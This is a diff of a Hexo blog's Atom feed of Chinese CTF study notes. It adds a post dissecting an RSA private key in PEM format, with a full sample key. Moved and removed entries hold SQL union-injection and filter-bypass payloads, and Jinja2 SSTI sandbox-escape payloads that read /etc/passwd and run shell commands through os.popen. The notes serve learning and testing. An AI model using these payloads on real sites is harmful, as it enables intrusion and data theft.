@@ -6,7 +6,7 @@
   <link href="https://smileless-l.github.io/atom.xml" rel="self"/>
   
   <link href="https://smileless-l.github.io/"/>
-  <updated>2026-03-01T14:28:56.017Z</updated>
+  <updated>2026-03-18T15:46:34.304Z</updated>
   <id>https://smileless-l.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pem分析</title>
+    <link href="https://smileless-l.github.io/2026/03/18/pem%E6%89%8B%E5%8A%A8%E5%88%86%E6%9E%90/"/>
+    <id>https://smileless-l.github.io/2026/03/18/pem%E6%89%8B%E5%8A%A8%E5%88%86%E6%9E%90/</id>
+    <published>2026-03-18T15:45:00.000Z</published>
+    <updated>2026-03-18T15:46:34.304Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="pem分析"><a href="#pem分析" class="headerlink" title="pem分析"></a>pem分析</h1><p>标签（空格分隔）： 技巧</p><hr><h2 id="内容介绍："><a href="#内容介绍：" class="headerlink" title="内容介绍："></a>内容介绍：</h2><p>X.509 是定义公钥证书格式的标准。 因此，这种格式描述了其他信息中的公钥。</p><p>DER是最流行的编码格式，用于在文件中存储 X.509 证书、PKCS8 私钥等数据。这是一种二进制编码，无法使用文本编辑器查看生成的内容。</p><p>PKCS8是用于存储私钥信息的标准语法。可以选择使用对称算法对私钥进行加密。</p><p>该标准不仅可以处理 RSA 私钥，还可以处理其他算法。PKCS8 私钥通常通过 PEM 编码格式进行交换。</p><p>PEM是 DER 证书的 base-64 编码机制。PEM 还可以对其他类型的数据进行编码，例如公钥&#x2F;私钥和证书请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">...Base64 encoding of the DER encoded certificate...</span><br><span class="line"></span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">MIICXAIBAAKBgQDnsN1F66mF6h6y/XpyN+ZU/w5AyeWBjZNIqi33/ATn4qQpw+kD</span><br><span class="line"></span><br><span class="line">HrKyF7sQ/RNw6tibM90iM6VOA14305umPbPROJJs3JoB6Lao74SUm58aO9T+Ct7r</span><br><span class="line"></span><br><span class="line">O52E+3r5jyDQicdRl6lIhLigNADXPD/KoNwfrRrCyw4wTHMZhSHc8eUHeQIDAQAB</span><br><span class="line"></span><br><span class="line">AoGABVTIgqddiztL4Yp7ms02e5Yy2cLLiSOc0/s2e5JM+pj4dg2P+wZlzjtFjqqE</span><br><span class="line"></span><br><span class="line">HAELYubam8LcduMU8+vmlPiufoK9fo47fLsX1PFCY9TDKL1dFlZgBAmJU7hR27h/</span><br><span class="line"></span><br><span class="line">gCo4r3PMub/snq7n+skrbarZbX1J6Q1o5UYKFIrrIjNObEECQQD0DIzIdMObPUUu</span><br><span class="line"></span><br><span class="line">W+JXg10kz/ayYn3irxZmp5ngc+b9WZfSOPehZBsLWsIb1eC7y9DZMhZfBQ/sPaO8</span><br><span class="line"></span><br><span class="line">0tvqJMUFAkEA8wlj3B3zK20pK+Hj+vFiAlaQmqILTSfv/9jMm8tbVfXt+bHrmZdN</span><br><span class="line"></span><br><span class="line">jruGVQDb7V2pW9HeG5PgDB3vKXeOiVfC5QJAYikKFzaf1rj2ModSqtBzjnL3Txi+</span><br><span class="line"></span><br><span class="line">eYbjA7c19UmpBw4aOrwfHhMdrZt7p6aHFgIMps+2n9Fxbhv8194YBj1z4QJAPONW</span><br><span class="line"></span><br><span class="line">XFg4iuGvVeoi9sSwvEs5sTP1xt/BlgSXxlRdTpztgQgdMX6hlKfQkM1FTCOSAYoD</span><br><span class="line"></span><br><span class="line">rj8O+5ooR+hHEoulLQJBAOtaMvMWIOG7mARngpwqfJ07L41/T0ITHteiiYJfCurz</span><br><span class="line"></span><br><span class="line">kLVCx1XA3MlN+u5gn7osUHMbah0Ze3uakSZ6za3mL5Y=</span><br><span class="line"></span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>base64解码为16进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">30 /tag(标签)/</span><br><span class="line">82025c /Length（长度）/</span><br><span class="line"></span><br><span class="line">020100 /版本号（整数 0）/</span><br><span class="line"></span><br><span class="line">02818100e7b0dd45eba985ea1eb2fd7a7237e654ff0e40c9e5818d9348aa2df7fc04e7e2a429c3e9031eb2b217bb10fd1370ead89b33dd2233a54e035e37d39ba63db3d138926cdc9a01e8b6a8ef84949b9f1a3bd4fe0adeeb3b9d84fb7af98f20d089c75197a94884b8a03400d73c3fcaa0dc1fad1ac2cb0e304c73198521dcf1e50779 /模数（n）/</span><br><span class="line"></span><br><span class="line">0203010001 /公钥指数（e）/</span><br><span class="line"></span><br><span class="line">0281800554c882a75d8b3b4be18a7b9acd367b9632d9c2cb89239cd3fb367b924cfa98f8760d8ffb0665ce3b458eaa841c010b62e6da9bc2dc76e314f3ebe694f8ae7e82bd7e8e3b7cbb17d4f14263d4c328bd5d16566004098953b851dbb87f802a38af73ccb9bfec9eaee7fac92b6daad96d7d49e90d68e5460a148aeb22334e6c41 /私钥指数（d）/</span><br><span class="line"></span><br><span class="line">024100f40c8cc874c39b3d452e5be257835d24cff6b2627de2af1666a799e073e6fd5997d238f7a1641b0b5ac21bd5e0bbcbd0d932165f050fec3da3bcd2dbea24c505 /素数1（p）/</span><br><span class="line"></span><br><span class="line">024100f30963dc1df32b6d292be1e3faf1620256909aa20b4d27efffd8cc9bcb5b55f5edf9b1eb99974d8ebb865500dbed5da95bd1de1b93e00c1def29778e8957c2e5 /素数2（q）/</span><br><span class="line"></span><br><span class="line">024062290a17369fd6b8f6328752aad0738e72f74f18be7986e303b735f549a9070e1a3abc1f1e131dad9b7ba7a68716020ca6cfb69fd1716e1bfcd7de18063d73e1 /指数1（dP）/</span><br><span class="line"></span><br><span class="line">02403ce3565c58388ae1af55ea22f6c4b0bc4b39b133f5c6dfc1960497c6545d4e9ced81081d317ea194a7d090cd454c2392018a03ae3f0efb9a2847e847128ba52d /指数2（dQ）/</span><br><span class="line"></span><br><span class="line">024100eb5a32f31620e1bb980467829c2a7c9d3b2f8d7f4f42131ed7a289825f0aeaf390b542c755c0dcc94dfaee609fba2c50731b6a1d197b7b9a91267acdade62f96 /系数（qInv）/</span><br></pre></td></tr></table></figure><p>长度字节的含义验证：</p><p>028181：81表示长度占用1字节，81&#x3D;129字节（含前导零）</p><p>028180：80&#x3D;128字节（无前导零）</p><p>0241：41&#x3D;65字节</p><p>0240：40&#x3D;64字节</p><h2 id="利用openssl进行分析"><a href="#利用openssl进行分析" class="headerlink" title="利用openssl进行分析"></a>利用openssl进行分析</h2><p>安装openssl后直接输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\koure&gt;openssl rsa -in C:\Users\koure\Desktop\1.pem -text -noout</span><br></pre></td></tr></table></figure><p>即可直接输出</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;pem分析&quot;&gt;&lt;a href=&quot;#pem分析&quot; class=&quot;headerlink&quot; title=&quot;pem分析&quot;&gt;&lt;/a&gt;pem分析&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： 技巧&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&quot;内容介绍：&quot;&gt;&lt;a href=&quot;#内容介绍：&quot; clas</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://smileless-l.github.io/categories/Crypto/"/>
+    
+    
+    <category term="技巧类" scheme="https://smileless-l.github.io/tags/%E6%8A%80%E5%B7%A7%E7%B1%BB/"/>
+    
+  </entry>
   
   <entry>
     <title>Pollard&#39;s p-1算法</title>
@@ -224,31 +250,6 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL union联合注入</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T16:58:56.357Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQL-union联合注入&quot;&gt;&lt;a href=&quot;#SQL-union联合注入&quot; class=&quot;headerlink&quot; title=&quot;SQL union联合注入&quot;&gt;&lt;/a&gt;SQL union联合注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
-&lt;p&gt;—首先数据</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SQL&quot;,&quot;号绕过</title>
     <link href="https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
     <id>https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</id>
@@ -275,20 +276,20 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL空格绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
+    <title>SQL&#39;select&#39;绕过</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</id>
     <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:05:40.978Z</updated>
+    <updated>2026-02-06T17:05:20.554Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
+    <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SQL’select’绕过&quot;&gt;&lt;a href=&quot;#SQL’select’绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL’select’绕过&quot;&gt;&lt;/a&gt;SQL’select’绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
+&lt;</summary>
       
     
     
@@ -327,20 +328,45 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL&#39;select&#39;绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</id>
+    <title>SQL union联合注入</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
     <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:05:20.554Z</updated>
+    <updated>2026-02-06T16:58:56.357Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;SQL’select’绕过&quot;&gt;&lt;a href=&quot;#SQL’select’绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL’select’绕过&quot;&gt;&lt;/a&gt;SQL’select’绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SQL-union联合注入&quot;&gt;&lt;a href=&quot;#SQL-union联合注入&quot; class=&quot;headerlink&quot; title=&quot;SQL union联合注入&quot;&gt;&lt;/a&gt;SQL union联合注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
+&lt;p&gt;—首先数据</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL空格绕过</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:05:40.978Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;</summary>
+&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
       
     
     
@@ -377,58 +403,6 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SSTI简记</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:01:54.618Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SSTI简记"><a href="#SSTI简记" class="headerlink" title="SSTI简记"></a>SSTI简记</h1><p>标签（空格分隔）： ssti</p><hr><h2 id="识别模板引擎"><a href="#识别模板引擎" class="headerlink" title="##识别模板引擎##"></a>##识别模板引擎##<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; → 49 (成功)     # Jinja2, Twig</span><br><span class="line">$&#123;7*7&#125; → 49 (成功)      # FreeMarker</span><br><span class="line">&lt;%= 7*7 %&gt; → 49 (成功)  # ERB, Ruby</span><br><span class="line">#&#123;7*7&#125; → 49 (成功)      # Jade/Pug</span><br></pre></td></tr></table></figure></h2><p>###基础知识类###</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>‘’</td><td>一个具体的对象</td></tr><tr><td><strong>class</strong></td><td>查看这个对象的类</td></tr><tr><td><strong>mro</strong></td><td>查看类的继承关系</td></tr><tr><td><strong>mro</strong>[1]</td><td>获取基类（object）</td></tr><tr><td><strong>subclasses</strong>()</td><td>获取所有子类</td></tr></tbody></table><hr><p>###沙盒逃逸(Jinjia2&#x2F;Flask)###</p><p>####A基础对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;  # 获取字符串类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;  # 方法解析顺序</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;  # 所有子类</span><br></pre></td></tr></table></figure><p>####B寻找危险类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找file类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>file类只能是大概在40左右具体的得通过不断的尝试来获取,然后直接查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找os模块</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>os模块可以直接调用命令来进行比如system(‘ls’)之类的</p><p><code>大概位置如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Python 2常见索引</span><br><span class="line"># 常见的危险类索引</span><br><span class="line">file类: 索引40左右</span><br><span class="line">subprocess.Popen: 索引258左右</span><br><span class="line">os._wrap_close: 索引132左右（在socket模块中）</span><br><span class="line"></span><br><span class="line"># Python 3常见索引</span><br><span class="line">_io.TextIOWrapper: 索引4左右（用于文件操作）</span><br><span class="line">subprocess.Popen: 索引289左右</span><br><span class="line">os._wrap_close: 索引132左右（最常用！）</span><br></pre></td></tr></table></figure><p><code>常见的payload如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RCE示例</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SSTI简记&quot;&gt;&lt;a href=&quot;#SSTI简记&quot; class=&quot;headerlink&quot; title=&quot;SSTI简记&quot;&gt;&lt;/a&gt;SSTI简记&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： ssti&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id=&quot;识别模板引擎&quot;&gt;&lt;a href=&quot;#识别模板</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SSTI" scheme="https://smileless-l.github.io/tags/SSTI/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL堆叠注入</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
